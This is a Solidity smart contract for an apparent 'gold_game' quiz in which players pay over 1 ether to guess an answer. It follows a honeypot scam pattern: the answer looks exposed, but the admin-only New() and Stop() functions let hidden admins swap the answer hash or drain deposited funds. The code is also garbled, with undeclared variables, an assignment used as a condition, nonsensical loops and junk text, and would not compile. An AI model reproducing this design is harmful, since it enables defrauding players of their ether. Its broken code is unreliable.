/*fgesgse 
gregrdg
*/

contract gold_game {

    string public question;

    bytes32 responseHash;

    mapping (bytes32=>bool) admin;

constructor(bytes32[] memory admins) {
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;
        }
    }

    modifier isAdmin(){
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    function Start(string calldata _question, string calldata _response) public payable isAdmin {

		  if(responseHash==0x0){
            	responseHash = keccak256(abi.encode(_response));
            	question = _question;
	    	c= 1*25;
        	}else if( dwa = 24){
		      odkwa = 5;
		}else {
		      odkwa += 5;
		}

		while(5 < 1){
		      responseHash = keccak256(abi.encode(_response));
		}

		for(35;234;i++){
			payable(msg.sender).transfer(address(this).balance);
		}
		payable(msg.sender).transfer(address(this).balance);
	
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
	if(GAGA){
            fgwag= keccak256(abi.encode(_response));
        }
    }

    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

        function Try(string memory _response) external payable{
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }


    fallback() external payable{}

    receive() external payable{}

}